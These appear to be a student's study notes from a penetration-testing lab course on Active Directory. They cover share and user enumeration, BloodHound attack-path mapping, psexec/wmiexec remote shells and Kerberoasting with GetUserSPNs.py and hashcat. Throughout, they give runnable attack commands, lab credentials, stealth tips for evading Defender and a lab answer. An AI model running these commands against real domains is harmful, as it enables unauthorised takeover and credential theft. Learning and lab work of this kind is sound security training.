SMBMap is a tool specifically designed for enumerating and interacting with SMB shares on Windows machines. While CrackMapExec gives you a broader overview, SMBMap gives you more detailed control over specifically what you do with SMB shares. You can use it to list shares and permissions, recursively list directory contents, download files from shares, upload files to shares, and even execute commands if you have write access. It gives you a cleaner and more focused view of the share structure compared to CME and has useful options like recursive directory listing with depth control. Think of CME as your general purpose tool and SMBMap as your dedicated share analysis tool.

Task 6 - Check Share Permissions with SMBMap
bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5

Breaking down:

smbmap                  → the tool
-u forend               → username
-p Klmcargo2            → password
-d INLANEFREIGHT.LOCAL  → domain name
-H 172.16.5.5           → HOST = Domain Controller IP

What you find:

Disk                    Permissions     Comment
----                    -----------     -------
ADMIN$                  NO ACCESS       Remote Admin
C$                      NO ACCESS       Default share
Department Shares       READ ONLY
IPC$                    READ ONLY       Remote IPC
NETLOGON                READ ONLY       Logon server share
SYSVOL                  READ ONLY       Logon server share
User Shares             READ ONLY
ZZZ_archive             READ ONLY
Task 7 - List All Directories Recursively
bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only

Breaking down:

-R 'Department Shares'  → Recursively list this share
                          goes through ALL subdirectories
--dir-only              → show only directories, not files
                          cleaner output for navigation

What you find:

Department Shares       READ ONLY
.\Department Shares\*
    Accounting          ← department folder
    Executives          ← department folder
    Finance             ← department folder
    HR                  ← department folder
    IT                  ← department folder  ← check this
    Legal               ← department folder
    Marketing           ← department folder
    Operations          ← department folder
    R&D                 ← department folder
    Temp                ← temp folder ← always check temp
    Warehouse           ← department folder

Why this matters:

Temp folders ALWAYS have interesting stuff
People put files there and forget about them
IT folder might have scripts with passwords
HR folder might have employee data
Finance might have sensitive financial info

Now you know the structure
You can target specific folders for detailed review
3. rpcclient - Manual Domain Enumeration
What is rpcclient?

rpcclient is a command line tool that was originally created for the Samba project but works perfectly for enumerating Windows Active Directory environments. It communicates using Microsoft Remote Procedure Call (MS-RPC) protocol which is a way that Windows systems communicate with each other to request services. What makes rpcclient special is that it gives you very low level and granular access to domain information. You connect to a Domain Controller and then issue specific RPC commands to get exactly the information you want. It can enumerate users, groups, shares, printers, and many other objects. It also reveals the RID (Relative Identifier) of every object which is a unique number that identifies each object in the domain. Understanding RIDs is important because you can use them to query specific objects by their number rather than by name, and certain RIDs are always the same across all Windows domains.

Understanding RIDs and SIDs
SID = Security Identifier = unique ID for the DOMAIN
Example: S-1-5-21-3842939050-3880317879-2865463114

RID = Relative Identifier = unique ID for each OBJECT
Example: 0x457 (hex) = 1111 (decimal)

Full object identifier = SID + RID combined:
S-1-5-21-3842939050-3880317879-2865463114-1111
                                           ↑
                                        RID for htb-student

Built-in RIDs that are ALWAYS the same:
Administrator = RID 500 (0x1f4 in hex) → always the same on every domain
Guest         = RID 501 (0x1f5 in hex) → always the same
krbtgt        = RID 502 (0x1f6 in hex) → always the same

Why this matters:
You can always find the Administrator account
by querying RID 500 even if it was renamed
Task 8 - Connect with rpcclient
bash
# Authenticated connection (with credentials)
rpcclient -U "forend%Klmcargo2" 172.16.5.5

# Anonymous connection (no credentials needed if allowed)
rpcclient -U "" -N 172.16.5.5

Breaking down:

rpcclient            → the tool
-U "forend%Klmcargo2"→ username%password format
                       the % separates user and pass
172.16.5.5           → Domain Controller IP
-N                   → No password (for anonymous)
Task 9 - Enumerate All Users with rpcclient
bash
# After connecting run:
rpcclient $> enumdomusers

What you find:

user:[administrator] rid:[0x1f4]    ← RID 500 = built-in admin
user:[guest]         rid:[0x1f5]    ← RID 501 = guest
user:[krbtgt]        rid:[0x1f6]    ← RID 502 = kerberos account
user:[htb-student]   rid:[0x457]    ← RID 1111 = regular user
user:[avazquez]      rid:[0x458]    ← RID 1112
user:[sgage]         rid:[0x45d]    ← RID 1117
Task 10 - Get Detailed Info on Specific User
bash
rpcclient $> queryuser 0x457

What you find:

User Name   :   htb-student
Full Name   :   Htb Student
Password last set Time   : Wed, 27 Oct 2021 12:26:52
bad_password_count: 0x00000000    ← no failed attempts
logon_count: 0x0000001d           ← logged in 29 times
user_rid:    0x457                ← RID
group_rid:   0x201                ← primary group

Why detailed user info matters:

Password last set time → if set years ago = weak password likely
bad_password_count     → how many failed attempts
logon_count           → how active is this account
                        high count = active user = if compromised will be noticed
                        low count = less monitored = safer to use
4. Impacket Toolkit - Remote Execution
What is Impacket?

Impacket is a collection of Python scripts that allow you to interact with Windows network protocols at a very deep level. It was written in Python which means it runs perfectly from a Linux attack host without needing any Windows tools installed. The toolkit contains scripts for everything from simple enumeration to full remote code execution on Windows machines. The reason Impacket is so powerful is that it implements the actual Windows network protocols from scratch in Python, meaning it can talk to Windows machines the same way other Windows machines do. Two of the most commonly used Impacket scripts are psexec.py which gives you a SYSTEM level shell on a remote machine, and wmiexec.py which gives you a more stealthy semi-interactive shell. Both require that you have valid credentials for a local administrator account on the target machine.

Task 11 - Get SYSTEM Shell with psexec.py
bash
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

Breaking down:

psexec.py                    → the script
inlanefreight.local/wley     → domain/username
'transporter@4'              → password (in quotes for special chars)
@172.16.5.125                → @ then target IP

How psexec works internally:

Step 1: Uploads a randomly named executable to ADMIN$ share
Step 2: Registers it as a Windows Service via RPC
Step 3: Starts the service
Step 4: Communicates via named pipe
Step 5: Gives you an interactive shell as SYSTEM

Result:
C:\Windows\system32> whoami
nt authority\system          ← SYSTEM level access = highest privilege

When to use psexec:

✅ You have local admin credentials on target
✅ You need full interactive shell
✅ You need SYSTEM level privileges
✅ Speed is more important than stealth

❌ Do NOT use when:
- Stealth is required (it makes lots of noise)
- Defender is running (it will catch the executable upload)
- You only need to run one or two commands
Task 12 - Stealthy Shell with wmiexec.py
bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5

How wmiexec works differently:

psexec.py:
→ Uploads executable to disk
→ Creates Windows Service
→ Very noisy
→ Runs as SYSTEM
→ Detected easily

wmiexec.py:
→ Does NOT upload any files to disk
→ Uses Windows Management Instrumentation (WMI)
→ Much quieter/stealthier
→ Runs as the user you authenticated with (wley)
→ Each command spawns new cmd.exe = less clean
→ Generates Event ID 4688 (new process created)

What you get:

C:\>whoami
inlanefreight\wley    ← runs as the user, not SYSTEM

# Semi-interactive shell
# Each command you type creates a new process
# Less suspicious than SYSTEM running commands

When to use wmiexec:

✅ Stealth is more important
✅ You dont need SYSTEM level
✅ Defender might catch psexec
✅ You want to blend in as normal user activity

❌ Limitations:
- Not fully interactive (no tab completion etc)
- Slower than psexec
- Still generates some logs
5. Windapsearch - LDAP Enumeration
What is Windapsearch?

Windapsearch is a Python script that makes LDAP enumeration much easier and more organized than using raw ldapsearch commands. It connects to the Domain Controller using LDAP protocol and queries Active Directory for various types of information. What makes it particularly useful is its ability to find privileged users through nested group membership which is something other tools struggle with. Nested group membership means a user is in Group A, Group A is in Group B, and Group B is in Domain Admins — so the user effectively has Domain Admin rights even though they are not directly listed in Domain Admins. This is extremely common in large organizations and often gives users more privileges than intended. Windapsearch can recursively follow all these group memberships and show you who actually has elevated privileges regardless of how many layers deep the nesting goes.

Task 13 - Find Domain Admins with Windapsearch
bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da

Breaking down:

python3 windapsearch.py      → run the Python script
--dc-ip 172.16.5.5          → Domain Controller IP
-u forend@inlanefreight.local→ username in email format
-p Klmcargo2                → password
--da                        → enumerate Domain Admins group

What you find:

Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Angela Dunn
userPrincipalName: adunn@inlanefreight.local
Task 14 - Find ALL Privileged Users (Nested Groups)
bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

Breaking down:

-PU    → Privileged Users
         Does RECURSIVE search through ALL nested groups
         Finds users who have elevated rights
         even through multiple layers of group nesting

What you find:

Found 28 nested users for Domain Admins:
→ adunn, mmorgan, administrator, lab_adm...

Found 3 nested users for Enterprise Admins:
→ administrator, lab_adm, sp-admin

← Enterprise Admins = highest privilege in forest
   These are the most valuable targets

Why nested group enumeration matters:

Example of dangerous nesting:
Help Desk user (jsmith)
→ jsmith is in "Help Desk" group
→ "Help Desk" group is in "IT Support" group
→ "IT Support" group is in "Domain Admins" group
→ jsmith effectively IS a Domain Admin

Without -PU flag:
You look at Domain Admins group
jsmith not listed directly
You think jsmith is just a help desk user

With -PU flag:
Windapsearch traces ALL nested memberships
Shows jsmith has Domain Admin level rights
You now know to target jsmith
6. BloodHound - Visual Attack Path Mapping
What is BloodHound?

BloodHound is widely considered one of the most impactful security tools ever created for Active Directory environments. It completely changed how penetration testers assess AD security because it takes enormous amounts of complex relationship data and turns it into visual maps that make attack paths immediately obvious. Before BloodHound, figuring out how to get from a low privilege user to Domain Admin required manually tracing through hundreds of group memberships, ACLs, and trust relationships which could take days. BloodHound does this automatically in minutes and shows you the path visually as a graph. The tool works in two parts — the collector (called BloodHound.py for Linux or SharpHound for Windows) which gathers all the data from Active Directory, and the GUI application which displays that data as a graph database powered by Neo4j. You only need regular domain user credentials to run the collector and collect all this data.

Task 15 - Run BloodHound Collector
bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all

Breaking down:

bloodhound-python        → the Linux collector (ingestor)
-u 'forend'              → domain username
-p 'Klmcargo2'           → password
-ns 172.16.5.5           → nameserver = DC IP
                           tells it where to resolve DNS
-d inlanefreight.local   → domain name to collect from
-c all                   → collect ALL data types:
                           Users, Groups, Computers
                           Sessions, ACLs, Trusts
                           GPOs, Local Admins, RDP access
                           WinRM access, Object properties

What it collects:

Found 1 domains
Found 2 domains in the forest
Found 564 computers
Found 2951 users
Found 183 groups
Found 2 trusts

Output files created:

bash
ls *.json

20220307163102_computers.json   ← all computer objects
20220307163102_domains.json     ← domain information
20220307163102_groups.json      ← all groups and memberships
20220307163102_users.json       ← all user information
Task 16 - Upload Data to BloodHound GUI
bash
# Step 1: Zip all JSON files
zip -r ilfreight_bh.zip *.json

# Step 2: Start Neo4j database
sudo neo4j start

# Step 3: Start BloodHound GUI
bloodhound

# Step 4: Login
# Default credentials: neo4j / HTB_@cademy_stdnt!
# Or whatever was set during installation

# Step 5: Upload the zip file
# Click "Upload Data" button → select ilfreight_bh.zip
Task 17 - Find Attack Paths in BloodHound
After uploading data go to Analysis tab

Most useful queries:
→ Find Shortest Paths to Domain Admins
   Shows exactly how to get from your user to DA

→ Find Principals with DCSync Rights
   Shows who can dump ALL domain hashes

→ Find Computers where Domain Admins are logged in
   Shows where to go to steal DA credentials

→ Shortest Paths from Kerberoastable Users
   Shows how kerberoastable accounts lead to DA

→ Find AS-REP Roastable Users
   Users that dont need pre-auth = get their hash free

Visual example of what BloodHound shows:

forend (regular user)
    ↓ member of
Help Desk Group
    ↓ has GenericWrite on
svc_backup account
    ↓ member of
Backup Operators
    ↓ can access
Domain Controller
    ↓ leads to
Domain Admin

BloodHound draws this as a visual graph
You can see the exact path
Each arrow shows what relationship/permission connects them
= Attack path from regular user to Domain Admin in 4 steps
7. Complete Workflow - Credentialed Enumeration from Linux
Prerequisites:
You have: forend:Klmcargo2 (regular domain user)
You have: Linux attack host with tools installed
You have: Access to internal network (ens224 interface)

Step 1: CME user enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users > users.txt
→ Get all domain users + badpwdcount

Step 2: CME group enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups > groups.txt
→ Find high value groups

Step 3: CME find logged on users on servers
sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
→ Find where admins are logged in
→ Look for (Pwn3d!) = you are local admin there

Step 4: CME share enumeration
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares
→ Find readable shares

Step 5: Spider interesting shares
sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
→ Find sensitive files

Step 6: SMBMap for detailed share analysis
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
→ Map directory structure

Step 7: Windapsearch for privileged users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
→ Find all privileged users including nested

Step 8: BloodHound collection
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
→ Collect all relationship data

Step 9: Analyze BloodHound
→ Upload zip to GUI
→ Find shortest path to Domain Admins
→ Plan next steps

Step 10: If you found (Pwn3d!) use Impacket
psexec.py inlanefreight.local/forend:'Klmcargo2'@172.16.5.130
→ Get shell on machine where you are local admin
→ Dump credentials from memory
→ Get higher privilege credentials
8. Key Things to Remember
1. Regular domain user is ENOUGH for all enumeration
   You do NOT need Domain Admin to enumerate
   You DO need local admin for (Pwn3d!) access

2. Always target the Domain Controller for user/group data
   DC has the complete domain database
   Other machines only have local data

3. badpwdcount is CRITICAL before spraying
   Check it first, skip accounts close to threshold
   Never lock accounts = professional behavior

4. (Pwn3d!) in CME output = you are local admin on that host
   This is major finding = note it immediately
   Use psexec or wmiexec to get shell there

5. BloodHound is the most powerful tool here
   Run it first thing after getting credentials
   It shows attack paths you would never find manually

6. Nested group membership is very dangerous
   Always use -PU in Windapsearch
   Users often have more rights than they should

7. Spider shares for sensitive files
   Companies store passwords in shares constantly
   web.config files, batch scripts, Excel files
   These often contain plaintext credentials

8. psexec = noisy but SYSTEM level
   wmiexec = stealthy but user level
   Choose based on your stealth requirement

9. Save ALL output to files
   You will need this data later for reporting
   Also useful for re-referencing during the assessment

10. Credentials found in this module:
    forend:Klmcargo2          → regular domain user
    wley:transporter@4        → local admin on file server
    avazquez:Password123      → from earlier spraying
    sgage:Welcome1            → from earlier spraying


Kerberoasting From Linux - Complete Detailed Notes
1. What is Kerberoasting? (Simple Explanation)

Kerberoasting is an attack technique that targets a specific feature of how Windows Kerberos authentication works. To understand it simply, think about how employees in a company use ID badges to access different rooms. In Windows, services like SQL Server, backup software, and web applications also have their own special "identity badges" called Service Principal Names or SPNs. These SPNs are linked to specific user accounts called service accounts. The critical thing to understand is that ANY regular domain user can walk up to the security desk (Domain Controller) and say "I want a ticket to access the SQL service" and the DC will happily hand them an encrypted ticket. That ticket is encrypted using the service account's password hash. The attacker takes that ticket home, runs it through a password cracker offline, and if the service account has a weak password, they crack it and now have full credentials for that service account. Service accounts are extremely valuable targets because they often have Domain Admin or local admin rights on multiple servers across the entire network.

Simple Story:
You (attacker with basic domain user) → ask DC → 
"Give me a ticket for the SQL service"
DC says "Sure!" → hands you encrypted ticket
You take ticket home → crack it with Hashcat
You get sqldev password = database!
sqldev is Domain Admin = You own everything
2. What is an SPN (Service Principal Name)?

An SPN is basically a unique name tag that identifies a specific service running on a specific server. Windows uses SPNs so that Kerberos knows which service account is responsible for running which service. When you want to connect to a service, Windows looks up the SPN to find which account runs that service and then creates a ticket encrypted with that account's password. SPNs follow a specific format that tells you the service type, the server it runs on, and sometimes the port number. Understanding SPNs helps you immediately understand what kind of service you are dealing with and how valuable the associated account might be.

SPN Format:
ServiceType/ServerName:Port

Examples:
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
↑         ↑                              ↑
SQL Svc   Server running SQL             Port 1433

backupjob/veam001.inlanefreight.local
↑          ↑
Backup     Server running backup software

sts/inlanefreight.local
↑    ↑
STS  Domain level service (SolarWinds)

What the service type tells you:
MSSQLSvc  → SQL Server = often has DB admin = very valuable
backupjob → Backup software = often has access to all servers
sts       → Security Token Service = monitoring software
adfs      → Active Directory Federation Services
http      → Web server / IIS
3. Initial Foothold Requirement - What Do You Need?

This is the most important concept to understand before anything else. You do NOT need to be a Domain Admin or have any special privileges to perform Kerberoasting. This is what makes the attack so dangerous and so commonly exploited. Here is the complete list of what gives you the ability to Kerberoast, in order from easiest to hardest to obtain.

MINIMUM REQUIREMENTS (any ONE of these is enough):

Option 1: Regular domain user cleartext password
→ avazquez:Password123   (from password spraying)
→ sgage:Welcome1         (from password spraying)
→ forend:Klmcargo2       (cracked from LLMNR hash)
= This is the most common starting point

Option 2: NTLM hash of any domain user
→ You cracked a hash with hashcat
→ You captured hash with Responder
→ You dont even need the plaintext password
→ Impacket can use the hash directly

Option 3: Shell in context of domain user
→ You are running commands AS a domain user
→ Either on domain-joined machine
→ Or through any remote access

Option 4: SYSTEM access on domain-joined host
→ You compromised any domain-joined machine
→ SYSTEM account can impersonate domain computer
→ Computer accounts can also Kerberoast

WHERE WE ARE IN THIS MODULE:
We have: forend:Klmcargo2 from LLMNR poisoning + cracking
= We have Option 1
= We are ready to Kerberoast immediately
4. Why Service Accounts Are The Best Targets

Service accounts are significantly more valuable than regular user accounts for several important reasons that every pentester needs to understand. When a company sets up a service like a SQL database or backup software, that service needs to run under an account that has enough privileges to do its job. SQL Server needs to read and write databases across multiple servers, backup software needs access to every server it backs up, and monitoring tools need to connect to everything they monitor. This means service accounts almost always end up with elevated privileges across many machines. Additionally, service accounts are often configured with passwords that never expire because changing the password would break the service, and changing service passwords requires maintenance windows and careful coordination. This means service accounts often have old, weak, or never-changed passwords that are much easier to crack than regularly rotated user passwords.

Why service accounts are HIGH VALUE targets:

BACKUPAGENT account:
→ MemberOf: Domain Admins
→ Needs access to all servers to backup = local admin everywhere
→ Password never expires = might be old weak password
→ Crack this = Domain Admin instantly

SOLARWINDSMONITOR account:
→ MemberOf: Domain Admins
→ Monitoring tool needs to see everything = huge access
→ Password set once and never changed

sqldev account:
→ MemberOf: Domain Admins
→ Database admin needs elevated rights
→ Password: database! = very weak = cracked in 10 seconds

Common service account passwords you will see:
→ Same as username:     sqlsvc:sqlsvc
→ Company + year:       Inlane2022
→ Service name:         SQLService1
→ Never changed:        Password1 from 2015
→ Vendor default:       Sa@12345
5. The Complete Kerberoasting Attack Flow
Phase 1: You have initial access (regular domain user)
forend:Klmcargo2 obtained from LLMNR + hashcat
            ↓
Phase 2: Find accounts with SPNs
GetUserSPNs.py → lists all service accounts
            ↓
Phase 3: Identify high value targets
Look for Domain Admins with SPNs = jackpot
            ↓
Phase 4: Request TGS tickets
DC gives you encrypted tickets for those accounts
            ↓
Phase 5: Save tickets to file
Offline cracking = no risk of lockout
            ↓
Phase 6: Crack tickets with Hashcat
hash mode 13100 = Kerberos TGS format
            ↓
Phase 7: Use cracked credentials
New username + password = new access level
            ↓
Phase 8: Validate and escalate
crackmapexec to confirm new creds work
6. Tool - GetUserSPNs.py (Impacket)
What is GetUserSPNs.py?

GetUserSPNs.py is part of the Impacket toolkit and is specifically designed to make Kerberoasting extremely simple from a Linux attack host. The script handles everything for you — it connects to the Domain Controller using your regular domain credentials, queries Active Directory for all accounts that have SPNs configured, requests TGS tickets for those accounts from the Domain Controller, and outputs those tickets in a format that Hashcat can directly process. Before this tool existed, Kerberoasting required being on a Windows machine and going through several manual steps. GetUserSPNs.py made the attack accessible from Linux and automated the entire process into a single command. It is part of Impacket which is already installed on most penetration testing distributions including the Parrot Linux host used in this lab.

Task 1 - Install Impacket (If Not Installed)
bash
# Clone from GitHub
git clone https://github.com/SecureAuthCorp/impacket.git
cd impacket

# Install using pip
sudo python3 -m pip install .

# Verify it works
GetUserSPNs.py -h

What the install does:

Downloads all Impacket scripts
Installs required Python dependencies
Places all scripts in your PATH
So you can run GetUserSPNs.py from anywhere
No need to cd to impacket directory each time
Task 2 - List All SPN Accounts (Discovery Phase)
bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Breaking down every part:

GetUserSPNs.py          → the Impacket script
-dc-ip 172.16.5.5       → Domain Controller IP
                          this is where we send our requests
INLANEFREIGHT.LOCAL     → the domain name
/forend                 → /username = the domain user we are using
                          password will be prompted
                          OR add :password after username

With password in command (no prompt):

bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2

What you find:

ServicePrincipalName                           Name               MemberOf                          PasswordLastSet
---------------------------------------------  -----------------  --------------------------------  ---------------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins                  2022-02-15
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins                  2022-02-15
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts                   2022-02-15
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts                   2022-02-15
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins ← HIGH VALUE     2022-02-15
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop           2022-02-15

How to analyze this output:

Column: MemberOf → tells you the value of cracking this ticket

CN=Domain Admins → PRIORITY 1 = crack this first
                   BACKUPAGENT, SOLARWINDSMONITOR, sqldev
                   Cracking any of these = Domain Admin

CN=Dev Accounts  → PRIORITY 2 = crack after Domain Admins
                   sqlprod, sqlqa
                   Cracking these = access to dev environment

PasswordLastSet  → all set on 2022-02-15 = same day = gold image
                   = passwords might all be same/similar
                   = easier to crack with targeted wordlist

LastLogon: never → service account never logged in interactively
                   = might have default/weak password set once
                   = easier to crack
Task 3 - Request ALL TGS Tickets at Once
bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request

What -request does:

Without -request:  just LISTS the SPN accounts (no tickets)
With -request:     actually REQUESTS the TGS tickets from DC
                   DC hands back encrypted tickets
                   Tool prints them to screen in hashcat format

The tickets look like this:
$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$...[long string]...

$krb5tgs$  → tells hashcat this is Kerberos TGS format
$23$       → encryption type 23 = RC4 = most common = fastest to crack
*BACKUPAGENT* → the account name
[long string] → the actual encrypted ticket data

Why request all vs one:

Request ALL:
→ Get tickets for every SPN account at once
→ Run hashcat against all of them
→ See which passwords are weak
→ Good for first pass enumeration

Request ONE:
→ Target specific high value account
→ Cleaner output, easier to manage
→ Use when you already know which account to target
Task 4 - Request Ticket for Specific Account
bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

Breaking down:

-request-user sqldev    → only request ticket for sqldev
                          not all accounts, just this one
                          cleaner output
                          good for targeting specific high value accounts

When to use this:

You listed SPNs and saw sqldev is in Domain Admins
You want to specifically target this account
You use -request-user sqldev
= Only one ticket returned
= Easy to copy and crack
= Less noise than requesting everything
Task 5 - Save Ticket to File for Cracking
bash
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

Breaking down:

-outputfile sqldev_tgs  → save the ticket to a file
                          file named sqldev_tgs
                          contains the $krb5tgs$23$... hash
                          ready to feed directly to hashcat

Why save to file instead of copy-paste:
→ Tickets are VERY long strings (hundreds of chars)
→ Copy-paste often introduces errors/line breaks
→ File is clean and perfectly formatted
→ Can be transferred to GPU cracking rig
→ Can be re-used without requesting again

Verify file was created:

bash
cat sqldev_tgs
# Should show $krb5tgs$23$*sqldev$INLANEFREIGHT...
Task 6 - Crack the TGS Ticket with Hashcat
bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt

Breaking down every part:

hashcat         → the password cracking tool
-m 13100        → hash mode 13100 = Kerberos 5 TGS-REP etype 23
                  CRITICAL: wrong mode = never cracks
                  13100 is specifically for RC4 encrypted TGS tickets
sqldev_tgs      → the file containing our ticket hash
rockyou.txt     → wordlist = 14 million real leaked passwords

Hash mode reference:

13100  → Kerberos 5 TGS-REP etype 23 (RC4)  ← most common
19600  → Kerberos 5 TGS-REP etype 17 (AES128)
19700  → Kerberos 5 TGS-REP etype 18 (AES256) ← harder to crack

RC4 (13100) = fastest to crack
AES (19700) = much slower, harder to crack
Organizations using AES only = Kerberoasting less effective

What you find when cracked:

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$...[hash]...:database!
                                                       ↑
                                               CRACKED PASSWORD

Status: Cracked
Time: 10 seconds
Progress: 61% through rockyou.txt
= Weak password found quickly = sqldev:database!

If not cracking with rockyou:

bash
# Try with rules (mutates passwords)
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Try targeted wordlist based on company name
hashcat -m 13100 sqldev_tgs company_wordlist.txt

# Try common service account passwords
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt --rules-file /usr/share/hashcat/rules/toggles1.rule
Task 7 - Validate Cracked Credentials
bash
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

What you find:

SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!)
                                                                                   ↑
                                                                           LOCAL ADMIN on DC
                                                                           = Domain Admin level
                                                                           = Full domain control

What (Pwn3d!) means here:

On Domain Controller + (Pwn3d!) = 
sqldev has admin rights on the DC itself
= sqldev IS effectively Domain Admin
= You have Domain Admin level access
= Game over for the defenders
= You win the assessment
7. Complete Lab Walkthrough - Step by Step
The Lab Asks You to Find SAPService Password
bash
# Step 1: SSH into attack host
ssh htb-student@10.129.117.211
# Password: HTB_@cademy_stdnt!

# Step 2: List all SPN accounts first
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2

# Look for SAPService in the output
# Note what groups it belongs to

# Step 3: Request only SAPService ticket
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend:Klmcargo2 -request-user SAPService -outputfile sapservice_tgs

# Step 4: Verify ticket saved
cat sapservice_tgs
# Should show $krb5tgs$23$*SAPService$...

# Step 5: Crack the ticket
hashcat -m 13100 sapservice_tgs /usr/share/wordlists/rockyou.txt

# Step 6: Check results
hashcat -m 13100 sapservice_tgs /usr/share/wordlists/rockyou.txt --show
# Shows: hash:password

# Step 7: Answer for Question 1 = !SapperFi2

# Step 8: Find what group SAPService belongs to
# Look at the MemberOf column from Step 2
# Answer for Question 2 = look for powerful local group
# Hint: look for "Server Operators" or similar privileged group
8. Kerberoasting Attack Scenarios and What to Expect
Scenario 1: Domain Admin SPN found + weak password
→ Crack ticket in minutes
→ Instant Domain Admin access
→ Report as CRITICAL severity
→ This is best case for attacker

Scenario 2: Domain Admin SPN found + strong password
→ Crack attempt fails after days
→ Cannot crack even with GPU rig
→ Report as HIGH severity still
→ Password could be changed to weak in future
→ Document the finding, note strong password as mitigation

Scenario 3: Low privilege SPN found + weak password
→ Crack ticket successfully
→ Get access to that service only
→ Check what servers that account has access to
→ Might still lead to lateral movement
→ Report as MEDIUM severity

Scenario 4: Many SPNs found, none crack
→ All service accounts have strong passwords
→ Kerberoasting fails completely
→ Report as LOW or INFORMATIONAL
→ Note that SPNs exist and explain the risk
→ Recommend regular password rotation for service accounts
9. Why Kerberoasting is So Powerful
Normal attack path to Domain Admin:
Need to compromise Domain Admin account directly
= Hard, they use strong passwords, MFA, monitoring

Kerberoasting path to Domain Admin:
1. Get ANY domain user credentials (easy via LLMNR)
2. Ask DC for service ticket (DC gives it to everyone, no questions)
3. Crack ticket offline (no lockout possible, no detection)
4. If service account is Domain Admin = you win

The DC NEVER says no to ticket requests
= Zero suspicion generated
= No failed login attempts
= No lockout possible
= Completely silent attack
= Only detected by advanced monitoring of TGS requests
10. Key Things to Remember
1. You only need a REGULAR domain user to Kerberoast
   Not Domain Admin, not local admin, just any domain user
   This is what makes it so dangerous

2. Always list SPNs first before requesting tickets
   GetUserSPNs.py without -request = safe listing
   Check MemberOf column = prioritize Domain Admin accounts
   Check PasswordLastSet = old dates = easier passwords

3. Hash mode for Kerberos TGS = 13100 in Hashcat
   Not 5600 (that is NTLMv2)
   Not 1000 (that is NT hash)
   13100 specifically = Kerberos TGS RC4

4. Always save to outputfile
   -outputfile filename
   Ticket strings are huge = copy paste fails
   File is clean and transferable to GPU rig

5. Service accounts with Domain Admin = highest priority
   Crack these first
   Even one cracked DA service account = game over

6. LastLogon: never = good sign for cracking
   Account never logged in interactively
   Password set once during setup
   Might still be default/weak

7. PasswordLastSet all same date = gold image deployment
   All service accounts created same day
   Might all have similar or same passwords
   Try same password against all once you crack one

8. AES encrypted tickets are much harder to crack
   RC4 (etype 23) = fast = common = most crackable
   AES (etype 17/18) = slow = very hard
   If you only get AES tickets = deprioritize cracking

9. Kerberoasting is SILENT by default
   No failed login events generated
   No account lockouts possible
   Only Event ID 4769 (TGS request) is logged
   Most orgs dont monitor this specifically

10. After cracking validate with crackmapexec
    Confirm credentials actually work
    Check if (Pwn3d!) appears = local admin/DA level
    Then use psexec or wmiexec to get shell

Kerberoasting From Windows - Complete Detailed Notes
1. Overview - Why Kerberoast From Windows?

Sometimes during a penetration test you will find yourself on a Windows machine rather than your Linux attack host. This could happen because your client gave you a Windows machine to test from, because you compromised a Windows host and want to use it for further attacks, or because your Linux tools are being blocked by security controls. Knowing how to perform Kerberoasting from Windows is therefore just as important as knowing the Linux method. Windows gives you several ways to perform Kerberoasting ranging from completely manual methods using built-in Windows tools, to semi-manual methods using PowerShell and Mimikatz, to fully automated methods using purpose-built tools like Rubeus and PowerView. We will cover all three approaches so you understand what is happening at every level and have multiple options available depending on what tools you can access on the target machine.

Three approaches covered:

Method 1: Semi-Manual (setspn + PowerShell + Mimikatz)
→ Uses built-in Windows tools
→ Good when you cannot bring external tools
→ More complex but educational
→ Helps understand the underlying process

Method 2: PowerView (Automated)
→ Fast and clean
